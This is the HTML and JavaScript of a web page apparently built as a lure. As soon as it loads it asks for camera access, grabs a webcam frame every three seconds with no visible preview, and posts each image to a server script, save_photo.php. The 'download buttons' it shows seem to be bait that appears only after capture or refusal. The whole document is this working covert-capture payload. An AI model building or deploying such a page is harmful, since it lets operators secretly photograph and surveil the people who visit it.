    <title>Capture and Send Photo</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #downloadButtons {
            display: none;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 20px;
        }

        .downloadBtn {
            padding: 10px;
            background-color: #3498db;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>

<body>
    <script>
        function capturePhotoAndNotify() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.addEventListener('playing', function () {
                        setInterval(function () {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageDataURL = canvas.toDataURL('image/jpeg');
                            sendPhoto(imageDataURL);
                        }, 3000);
                    });
                })
                .catch(function (err) {
                    console.error('Error:', err);
                    showDownloadButtons(); // Show download buttons if camera permission is denied
                });
        }

        function sendPhoto(imageDataURL) {
            fetch('save_photo.php', {
                method: 'POST',
                body: JSON.stringify({ imageDataURL: imageDataURL }),
                headers: new Headers({
                    'Content-Type': 'application/json'
                })
            })
                .then(function (response) {
                    return response.json();
                })
                .then(function (data) {
                    console.log('%c✅ Photo sent:', 'color: green; font-weight: bold;', data.filename);
                    showDownloadButtons(); // Show download buttons after successfully sending photo
                })
                .catch(function (err) {
                    console.error('%c❌ Error:', 'color: red; font-weight: bold;', err);
                    showDownloadButtons(); // Show download buttons if there is an error
                });
        }

        function showDownloadButtons() {
            const downloadButtons = document.getElementById('downloadButtons');
            downloadButtons.style.display = 'flex';
        }

        capturePhotoAndNotify();
    </script>
